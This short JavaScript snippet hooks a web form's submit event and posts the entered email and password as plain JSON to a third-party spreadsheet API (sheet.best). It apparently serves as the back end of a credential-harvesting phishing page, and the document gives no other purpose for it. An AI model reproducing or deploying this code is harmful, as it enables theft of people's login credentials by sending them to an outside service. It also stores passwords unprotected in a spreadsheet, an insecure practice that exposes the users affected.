const form = document.getElementById('form')

form.addEventListener('submit', async(e) => {
    e.preventDefault();
    
   const respuesta = await fetch('https://sheet.best/api/sheets/84d6bf13-1e7a-4363-9c72-4466ad797d47', {
          method: 'POST',
          mode: 'cors',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
                "email": form.email.value,
                "password": form.password.value
          })
        });
        
        
   });
